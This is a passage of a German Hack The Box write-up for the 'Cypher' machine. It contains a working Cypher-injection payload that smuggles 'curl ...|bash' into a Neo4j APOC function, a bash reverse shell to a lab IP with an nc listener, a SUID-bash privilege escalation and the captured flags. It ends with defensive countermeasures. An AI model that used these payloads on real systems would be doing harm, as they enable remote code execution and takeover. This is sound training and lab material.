Wir testen weiter – unser Ziel ist Remote Code Execution (RCE).

Dokumentation zeigt, dass `apoc.custom` genutzt wird. Besonders gefährlich: `custom.getUrlStatusCode()`.

Wir erstellen `shell.sh` mit einer einfachen Bash‑Reverse‑Shell und liefern sie über den bereits laufenden Webserver:

```bash
# shell.sh
bash -i >& /dev/tcp/10.10.14.204/9001 0>&1
```

Listener starten:

```bash
nc -lvnp 9001
```

Dann bauen wir die Payload:

```json
{
  "username": "admin' RETURN h.value AS value UNION CALL custom.getUrlStatusCode('127.0.0.1;curl http://10.10.14.204:8000/shell.sh|bash;') YIELD statusCode AS value RETURN value;//",
  "password": "123"
}
```

Shell poppt – wir sind `neo4j`:

```
uid=997(neo4j) gid=995(neo4j)
```

![shell](Screenshot_2025-05-05_15_48_30-1.png)

---

## 6. Privilege Escalation → root

Wir suchen lokal nach Konfigurationsdateien, Umgebungsvariablen und SUID‑Binaries.

Zuerst entdecken wir ein Passwort in der Datei `bbot_preset.yml` (Zeile 10).

```bash
cat /opt/bbot/bbot_preset.yml
```

→ Enthält Klartext‑Passwort.

`su graphasm` klappt nicht – aber Bash mit SUID:

```bash
/tmp/bash -p
```

Jetzt sind wir root:

```bash
id
uid=0(root) gid=0(root)
```

![root shell](Screenshot_2025-05-05_15_50_40.png)

---

## 7. Flags

```bash
cat /home/graphasm/user.txt
→ 0a4de27fa731a210ead73b20dfc80140

cat /root/root.txt
→ e5577526fb5f80c5cb113cde4111ab3d
```

![1746479136549](image/Cypher/1746479136549.png)

![alt text](Screenshot 2025-05-05 at 15-53-50 Hack The Box Hack The Box.png)

HTB‑Link: [https://www.hackthebox.com/achievement/machine/2350832/650](https://www.hackthebox.com/achievement/machine/2350832/650)


## Empfehlungen & Geeignete Gegenmassnahmen

1.**Cypher-Injection absichern**

- Die Applikation war verwundbar gegenüber Cypher-Injection durch direkte String-Konkatenation in Neo4j-Abfragen.

   → **Massnahme:** Nutzung von **parametrisierten Cypher-Queries**, z. B. mit `$parameter`-Syntax, um direkte Injektionen zu verhindern.

2.**APOC-Plugins wie getUrlStatusCode beschränken**

- Die Funktion `custom.getUrlStatusCode()` wurde missbraucht, um RCE über `curl|bash` zu erzielen.

   → **Massnahme:** Deaktivieren oder hart absichern aller **unsicheren APOC-Prozeduren**, z. B. durch Whitelisting in der Konfiguration.

3.**Exfiltration über LOAD CSV verhindern**

- Durch `LOAD CSV FROM 'http://attacker'` konnte ein Hash exfiltriert werden.

   → **Massnahme:** Ausgehenden Netzwerkverkehr der Datenbank einschränken, insbesondere HTTP-Zugriffe durch Neo4j.

4.**Zugangsdaten nicht im Klartext speichern**

- Ein Passwort wurde im Klartext in `bbot_preset.yml` gefunden.

   → **Massnahme:** Konfigurationsdateien niemals für Klartext-Passwörter verwenden, sondern Umgebungsvariablen oder sichere Vaults.

5.**SUID-Binaries prüfen**

- SUID-Bash ermöglichte eine einfache Privilege Escalation.

   → **Massnahme:** Regelmässiger Audit aller SUID/SGID-Binaries mit Tools wie `find / -perm -4000 -type f -exec ls -la {} \;`

6.**Minimalprinzip für Benutzerrechte**

- Der Benutzer `neo4j` hatte Zugriff auf sensible Dateien und konnte durch Injektion Systemkommandos ausführen.

   → **Massnahme:** Rechte der Datenbankbenutzer auf das absolute Minimum reduzieren, insbesondere bei selbstgebauten Plugins oder Extensions.

7.**Logging und Monitoring**

- Es gab keinerlei Hinweis auf Überwachung oder Alarme bei ungewöhnlichem Verhalten (z. B. externer HTTP-Zugriff durch DB).

   → **Massnahme:** Integration von SIEM, File Integrity Monitoring und Alerting bei Anomalien im Datenbank- oder Web-Stack.
